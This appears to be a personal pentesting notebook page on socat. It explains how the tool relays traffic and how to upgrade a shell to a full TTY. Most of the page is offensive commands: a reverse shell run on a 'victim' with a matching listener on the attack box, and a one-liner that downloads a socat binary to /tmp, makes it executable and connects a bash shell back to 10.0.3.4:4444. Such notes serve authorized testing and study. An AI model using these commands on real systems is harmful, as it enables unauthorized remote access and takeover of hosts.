```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Summary
[Socat](https://linux.die.net/man/1/socat) is similar to netcat but offers some additional features, like bi-directional port forwarding to connected serial devices. One particular use is to [upgrade a shell to a fully interactive TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat). The standalone binary of *socat* can be transferred to a target for a more stable reverse shell connection.

Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunnelling. It acts as a redirector that listens on on host and port, forwarding the traffic to another host and port.
## Installation
```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
```

## Documentation
**Cheatsheet:** 
**Website:** 
- http://www.dest-unreach.org/socat/
- https://github.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat
## Usage
### Create a Socat TTY reverse shell
On the victim (with Socat installed):
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[atkbox IP]:[port]
```
On attack box, listen with:
```
socat file:`tty`,raw,echo=0 tcp-listen:[port]
```

### Install Socat, chmod it, exec TTY reverse shell
```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
1. This downloads Socat from : [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries) to a writable directory
2. Chmod it to be executable
3. Then execute the reverse shell

### Reverse shell redirection
![[Pivoting, Tunnelling, and Port Forwarding#Using Socat redirection for Reverse Shells]]

### Bind shell redirection
![[Pivoting, Tunnelling, and Port Forwarding#Using Socat redirection for Bind Shells]]